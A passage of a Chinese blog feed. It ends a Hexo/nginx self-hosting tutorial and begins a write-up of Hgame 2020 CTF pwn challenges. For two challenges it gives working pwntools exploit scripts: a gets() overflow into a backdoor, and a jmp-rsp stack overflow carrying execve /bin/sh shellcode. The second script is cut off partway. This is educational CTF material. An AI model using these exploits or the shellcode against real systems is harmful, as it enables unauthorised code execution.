fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/nginx/conf.d/default.conf</span></span><br></pre></td></tr></table></figure></div><p>修改location中的目录为<code>git</code>的工作目录<code>/var/www/hexo</code>即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    # listen       8080; </span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    #access_log  /var/log/nginx/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /var/www/hexo;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /var/www/hexo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http://127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    root           html;</span><br><span class="line">    #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    #    fastcgi_index  index.php;</span><br><span class="line">    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">    #    include        fastcgi_params;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # deny access to .htaccess files, if Apache's document root</span><br><span class="line">    # concurs with nginx's one</span><br><span class="line">    #</span><br><span class="line">    #location ~ /\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>增加/修改server中监听的端口可以把网页映射到多个端口</p></blockquote><p>重启服务：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo service nginx restart</span></span><br></pre></td></tr></table></figure></div><h3 id="修改-config-yml-1"><a href="#修改-config-yml-1" class="headerlink" title="修改_config.yml"></a>修改_config.yml</h3><p>修改<code>_config.yml</code>末尾的部署配置，可以在repo中新增一条：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">'git'</span></span><br><span class="line">  <span class="attr">repo:</span> </span><br><span class="line">    <span class="attr">github:</span> <span class="string">https://github.com/username/username.github.io.git</span></span><br><span class="line">    <span class="attr">mygit:</span>  <span class="string">git@your_server_ip:/TaQini/blog.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></div><h3 id="执行部署命令-1"><a href="#执行部署命令-1" class="headerlink" title="执行部署命令"></a>执行部署命令</h3><p>配置完，执行部署命令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo d</span></span><br><span class="line">...</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line">git@your_server_ip's password: &lt;your_git_password&gt;</span><br><span class="line">Enumerating objects: 108, done.</span><br><span class="line">Counting objects: 100% (108/108), done.</span><br><span class="line">Delta compression using up to 4 threads</span><br><span class="line">Compressing objects: 100% (37/37), done.</span><br><span class="line">Writing objects: 100% (58/58), 9.71 KiB | 2.43 MiB/s, done.</span><br><span class="line">Total 58 (delta 27), reused 0 (delta 0)</span><br><span class="line">To 47.100.63.152:/TaQini/blog.git</span><br><span class="line">   7015c2f..f2567fd  HEAD -&gt; master</span><br><span class="line">Branch 'master' set up to track remote branch 'master' from 'git@your_server_ip:/TaQini/blog.git'.</span><br><span class="line">INFO  Deploy done: git</span><br></pre></td></tr></table></figure></div><blockquote><p>your_git_password：部署时需要输入服务器git用户的密码</p></blockquote><p>直接访问<a href="https://your_server_ip" target="_blank" rel="noopener">https://your_server_ip</a>，即可访问刚刚部署的网站</p><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>以上就是全部的博客搭建操作啦，如果其中有什么错误，欢迎小伙伴儿们在下方评论区中指正~</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 建站 </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hgame 2020 pwn writeup</title>
      <link href="/2020/02/12/2020-Hgame-pwn-writeup/"/>
      <url>/2020/02/12/2020-Hgame-pwn-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-Hgame"><a href="#2020-Hgame" class="headerlink" title="2020 Hgame"></a>2020 Hgame</h1><p>Hgame是杭电在寒假期间举办的新生赛，持续时间长达四周，每周都会放出新题，越到后面难度越大。比赛好像是1月16号开始的，到2月14号结束（情人节？）…</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212004711.png" data-fancybox="group" data-caption="main_page" class="fancybox"><img alt="main_page" title="main_page" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212004711.png" src="/img/loading.gif" class="lazyload"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>春节期间，在河北老家待着，十分无聊，又赶上新冠疫情蔓延，出家无望，此时<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅对我说：</p><blockquote><p>来打CTF鸭！</p></blockquote><p>于是，错过注册日期的我，用imagin师傅的帐号来Hgame凑凑热闹，重新拾起我丢了多年的pwn…</p><h1 id="比赛规则"><a href="#比赛规则" class="headerlink" title="比赛规则"></a>比赛规则</h1><ol><li>比赛分为线上赛（面向所有选手进行）与线下赛（仅面向部分校内选手）；</li><li>所有选手均以个人为单位参赛；</li><li>禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路等，对平台、参赛者或其他人员进行攻击等，违者分数作废并取消比赛资格；</li><li>每周结束后，校内选手请发送该周题目的 Writeup 到 <a href="mailto:wp@vidar.club">wp@vidar.club</a>，截止时间为每周五晚上八点；</li><li><strong>在<em>每周五晚上八点</em>之前，请校内外的师傅们不要散播任何与上一周题目有关的题解、Flag；</strong></li><li>每道题目的一、二、三血分别有 5%、 3%、1% 的额外分数加成。</li></ol><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><p>我是大年三十开始做的，所以完美的错过了week1的比赛时间，不过还是做了做week1的pwn，就当是预习一下吧~</p><h2 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h2><ul><li>题目描述：无脑AAA太无聊了，挑战更高难度的无脑AAA！</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_1/Hard_AAAAA" target="_blank" rel="noopener">Hard_AAAAA</a></li><li>考察点：变量覆盖</li><li>难度：入门</li><li>分值：75</li><li>完成人数：172</li></ul><p>反汇编得到源码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">160u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(<span class="string">"0O0o"</span>, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>程序中存在后门<code>backdoor()</code>，开启后门的条件是变量<code>v5</code>等于<code>&quot;0O0o&quot;</code>，不难看出变量<code>s</code>其后便是变量<code>v5</code>，而<code>gets(&amp;s)</code>由于没有检查<code>s</code>的长度，这将导致向<code>s</code>中输入过长的字符串时，覆盖掉变量<code>v5</code>的值，调试一下得到偏移量为123，所以只要输入<code>&#39;a&#39;*123+&#39;0O0o&#39;</code>即可启动后门，拿到shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>虽然没啥写脚本的必要，但是我写了个<a href="https://github.com/TaQini/ctf/tree/master/script" target="_blank" rel="noopener">脚本</a>，用来自动生成exp模板，就当是展示一下效果吧：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Hard_AAAAA'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">backdoor = <span class="number">0x8048636</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">123</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += <span class="string">'0O0o\0O0'</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">"Let's 0O0o\\0O0!\n"</span>)</span><br><span class="line"><span class="comment"># debug('b *0x080485FD')</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h2><ul><li>题目描述：看起来人畜无害的一些整数也能秒我？(吃惊)</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_2/Number_Killer" target="_blank" rel="noopener">Number_Killer</a> </li><li>考察点：整数shellcode</li><li>难度：简单</li><li>分值：100</li><li>完成人数：77</li></ul><p>首先查看程序的保护方式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> checksec Number_Killer </span></span><br><span class="line">[*] '/home/taqini/Desktop/ctf/hgame2020/pwn/week1_2/Number_Killer'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><p>什么保护都没有开，栈可执行，因此可以直接在栈中执行<code>shellcoode</code></p><p>接下来分析程序，程序反编译结果如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  __int64 v4[<span class="number">11</span>]; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's Pwn me with numbers!"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    v4[i] = readll();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里<code>v4</code>是个整数数组，长度为12，但是在for循环中却向<code>v4</code>中读了20个整数，因此将导致栈溢出。</p><p>用<code>gdb</code>调试程序，得到数组<code>v4</code>的首地址<code>v4 = 0x7fffffffda90</code>，以及返回地址<code>ret_addr = 0x7fffffffdaf8</code>，二者相差104个字节，由于<code>v4</code>存的整数<code>int64</code>类型，大小是8字节，因此读入13个整数后，将覆盖程序返回地址。</p><p>程序代码中有一个出题人给的<code>gift</code>函数：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400789 gift            proc near</span><br><span class="line">.text:0000000000400789 ; __unwind &#123;</span><br><span class="line">.text:0000000000400789                 push    rbp</span><br><span class="line">.text:000000000040078A                 mov     rbp, rsp</span><br><span class="line">.text:000000000040078D                 jmp     rsp</span><br><span class="line">.text:000000000040078D gift            endp</span><br></pre></td></tr></table></figure></div><p>能直接利用其中的<code>gadget: jmp rsp</code>，将返回地址覆盖为<code>0x40078D</code>(gadget的地址)，把程序的控制流劫持到栈中。溢出发生时<code>rsp</code>的值正好是<code>v4</code>的首地址，因此向<code>v4</code>中布置<code>shellcode</code>即可。</p><p>这题有以下几点要注意：</p><ul><li>只能输入13个整数，因此shellcode的长度应该小于104字节</li><li>需要将<code>shellcode</code>每8个字节转成一个<code>int64</code>，且在<code>readall()</code>存在检查，整数的长度不能超过20，因此需要寻找一个合适的<code>shellcode</code>，不能用<code>pwntool</code>自动生成</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Number_Killer'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"></span><br><span class="line">jrsp = <span class="number">0x0040078A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05\x00\x00'</span></span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x7fffffffda90</span></span><br><span class="line">ret = <span class="number">0x7fffffffdaf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">ru(<span class="string">'Let\'s Pwn me with numbers!\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">    sl(str(i))</span><br><span class="line">sl(str(<span class="number">0x0000000b00000000</span>))</span><br><span class="line">sl(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line">sl(str(jrsp))</span><br><span class="line"></span><br><span class="line">sh = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)/<span class="number">8</span>):</span><br><span class="line">    sh.append(u64(shellcode[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sh:</span><br><span class="line">    <span class="keyword">print</span> str(i),len(str(i))</span><br><span class="line">    sl(str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug('b *0x0000000000400766')</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span 